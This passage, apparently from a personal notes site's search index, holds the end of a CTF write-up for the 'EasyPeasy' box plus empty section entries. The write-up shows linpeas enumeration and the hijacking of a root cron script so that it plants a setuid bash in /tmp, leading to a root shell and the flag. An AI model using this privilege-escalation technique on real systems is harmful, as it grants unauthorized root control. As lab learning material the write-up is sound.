(180 KB/s) - \u2018linpeas.sh\u2019 saved [956174/956174]\n\nboring@kral4-PC:/tmp$ chmod +x linpeas.sh\nboring@kral4-PC:/tmp$ ./linpeas.sh\n\n#makar@LAPTOP-ASUME87D:~/pentest-tools  % python3 -m http.server 8000\n#Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...\n#10.201.72.248 - - [02/Sep/2025 09:50:07] \"GET /linpeas.sh HTTP/1.1\" 200 -\n\n#i don't know how but this grabbed my attention \n\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Web files?(output limit)\n/var/www/:\ntotal 16K\ndrwxr-xr-x  3 root   root   4.0K Jun 15  2020 .\ndrwxr-xr-x 14 root   root   4.0K Jun 13  2020 ..\ndrwxr-xr-x  4 root   root   4.0K Jun 15  2020 html\n-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh\n\n/var/www/html:\ntotal 32K\ndrwxr-xr-x 4 root root 4.0K Jun 15  2020 .\n#That .mysecretcronjob.sh felt important to me somehow among the huge output of linpeas. maybe i am builing a tiny bit of intution for this :)\n\nboring@kral4-PC:/tmp$ cd /var/www/\nboring@kral4-PC:/var/www$ ls\nhtml\nboring@kral4-PC:/var/www$ ls -la\ntotal 16\ndrwxr-xr-x  3 root   root   4096 Jun 15  2020 .\ndrwxr-xr-x 14 root   root   4096 Jun 13  2020 ..\ndrwxr-xr-x  4 root   root   4096 Jun 15  2020 html\n-rwxr-xr-x  1 boring boring   33 Jun 14  2020 .mysecretcronjob.sh\nboring@kral4-PC:/var/www$ cat .mysecretcronjob.sh\n#!/bin/bash\n# i will run as root\nboring@kral4-PC:/var/www$ ./.mysecretcronjob.sh\nboring@kral4-PC:/var/www$ whoami\nboring\nboring@kral4-PC:/var/www$ sudo -l\n[sudo] password for boring:\nSorry, user boring may not run sudo on kral4-PC.\n\n#Running this by myself wont work, it needs to be executed by the root i think. also there is nothing in the code that will get me to root. So,\n\nboring@kral4-PC:/var/www$ grep -R \".mysecretcronjob.sh\" /etc/cron* 2&gt;/dev/null\n/etc/crontab:* *    * * *   root    cd /var/www/ &amp;&amp; sudo bash .mysecretcronjob.sh\nboring@kral4-PC:/var/www$ cat /etc/crontab 2&gt;/dev/null | grep -i mysecret\n* *    * * *   root    cd /var/www/ &amp;&amp; sudo bash .mysecretcronjob.sh\nboring@kral4-PC:/var/www$ systemctl status cron 2&gt;/dev/null | sed -n '1,40p'\n\u25cf cron.service - Regular background program processing daemon\n   Loaded: loaded (/lib/systemd/system/cron.service; enabled; vendor preset: enabled)\n   Active: active (running) since Tue 2025-09-02 01:15:42 PDT; 1h 43min ago\n     Docs: man:cron(8)\n Main PID: 460 (cron)\n    Tasks: 1 (limit: 524)\n   CGroup: /system.slice/cron.service\n           \u2514\u2500460 /usr/sbin/cron -f\n\nWarning: Journal has been rotated since unit was started. Log output is incomplete or unavailable.\n#Ok, it was definitely running every minute. because those * mean \n# A '*' means \u201cevery value\u201d. So * * * * * = every minute of every hour, every day, every month, every weekday.\n# Because this is /etc/crontab, there\u2019s a user field (root) after the 5 time fields, so the command runs as root.\n\nboring@kral4-PC:/var/www$ nano .mysecretcronjob.sh\n\n#!/bin/bash                          # Shebang: run this script with Bash.\n# i will run as root                 # Just a Comment, won't run\n/bin/cp /bin/bash /tmp/bashroot      # Copies the bash binary to /tmp/bashroot\n/bin/chown root:root /tmp/bashroot   # Makes that copy owned by root\n/bin/chmod 4755 /tmp/bashroot        # Sets permissions to rwsr-xr-x (octal 4755)\n                                     4 in the leading position = setuid bit\n                                     7 = owner rwx\n                                     5 = group r-x\n                                     5 = others r-x\n#The setuid bit means: when any user runs /tmp/bashroot, the process runs with the effective UID of the file owner (root) \u2192 privilege escalation.\n\nboring@kral4-PC:/var/www$ ls -l /tmp/bashroot\n-rwsr-xr-x 1 root root 1113504 Sep  2 03:05 /tmp/bashroot\nboring@kral4-PC:/var/www$ /tmp/bashroot -p\nbashroot-4.4#\n\n#We are Root!!!!!!!!!\n\nbashroot-4.4# id\nuid=1000(boring) gid=1000(boring) euid=0(root) groups=1000(boring)\nbashroot-4.4# whoami\nroot\nbashroot-4.4# cd /\nbashroot-4.4# cd root\nbashroot-4.4# ls -la\ntotal 40\ndrwx------  5 root root 4096 Jun 15  2020 .\ndrwxr-xr-x 23 root root 4096 Jun 15  2020 ..\n-rw-------  1 root root  883 Jun 15  2020 .bash_history\n-rw-r--r--  1 root root 3136 Jun 15  2020 .bashrc\ndrwx------  2 root root 4096 Jun 13  2020 .cache\ndrwx------  3 root root 4096 Jun 13  2020 .gnupg\ndrwxr-xr-x  3 root root 4096 Jun 13  2020 .local\n-rw-r--r--  1 root root  148 Aug 17  2015 .profile\n-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt\n-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor\nbashroot-4.4# cat .root.txt\nflag{63a9f0ea7bb98050796b649e85481845}\n\n#Yesss! Let's GOooo.. Completed Fully!#\n</code></pre>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#8-afteraction-review-aar","title":"8) After\u2011Action Review (AAR)","text":"<ul> <li>What worked first time? e.g., base64 recognition, robots.txt lead.</li> <li>What wasted time? e.g., brute forcing without a clue; missed header.</li> <li>1 change for next time: e.g., always run <code>exiftool</code> on any media.</li> <li>Update your personal wordlists with themes you noticed here.</li> </ul>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#appendix-a-quick-theory-nuggets","title":"Appendix A \u2014 Quick Theory Nuggets","text":"","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#a1-setuid-in-one-minute","title":"A.1 Setuid in One Minute","text":"<ul> <li>Files have mode bits: read(4), write(2), execute(1).  </li> <li>The special setuid bit (4xxx) on an executable sets effective UID to owner on exec.  </li> <li>With <code>root:root</code> owner, <code>chmod 4755 bash</code> \u2192 <code>bash -p</code> runs with eUID=0.</li> </ul>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#a2-why-sc-sv","title":"A.2 Why <code>-sC -sV</code>?","text":"<ul> <li>Default scripts quickly surface misconfigs without being intrusive.  </li> <li>Version detection lets you map to known vulns (CVE search) or framework\u2011specific tricks.</li> </ul>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"ctf/web/easypeasy-ctf/#credits","title":"Credits","text":"<ul> <li>Box: EasyPeasy (web)  </li> <li>Author: Kareem  </li> <li>Toolkit: nmap, whatweb, gobuster, curl, exiftool, binwalk, strings, john/hashcat</li> </ul>","tags":["CTF","Web","Enumeration","Exploitation","Privilege Escalation"]},{"location":"kaggle/competitions/_index/","title":"Competitions","text":"","tags":["hub"]},{"location":"kaggle/eda/_index/","title":"Eda","text":"","tags":["hub"]},{"location":"kaggle/feature-engineering/_index/","title":"Feature Engineering","text":"","tags":["hub"]},{"location":"kaggle/models/_index/","title":"Models","text":"","tags":["hub"]},{"location":"math/calculus/_index/","title":"Calculus","text":"","tags":["hub"]},{"location":"math/discrete/_index/","title":"Discrete","text":"","tags":["hub"]},{"location":"math/linear-algebra/_index/","title":"Linear Algebra","text":"","tags":["hub"]},{"location":"math/probability/_index/","title":"Probability","text":"","tags":["hub"]},{"location":"math/statistics/_index/","title":"Statistics","text":"","tags":["hub"]},{"location":"notes/commands/cloud/_index/","title":"Cloud","text":"","tags":["hub"]},{"location":"notes/commands/docker/_index/","title":"Docker","text":"","tags":["hub"]},{"location":"notes/commands/kubernetes/_index/","title":"Kubernetes","text":"","tags":["hub"]},{"location":"notes/commands/linux/_index/","title":"Linux","text":"","tags":["hub"]},{"location":"notes/commands/windows/_index/","title":"Windows","text":"","tags":["hub"]},{"location":"swe/algorithms/_index/","title":"Algorithms","text":"","tags":["hub"]},{"location":"swe/cpp/_index/","title":"Cpp","text":"","tags":["hub"]},{"location":"swe/data-structures/_index/","title":"Data Structures","text":"","tags":["hub"]},{"location":"swe/python/_index/","title":"Python","text":"","tags":["hub"]},{"location":"swe/testing/_index/","title":"Testing","text":"","tags":["hub"]},{"location":"swe/tooling/_index/","title":"Tooling","text":"","tags":["hub"]}]}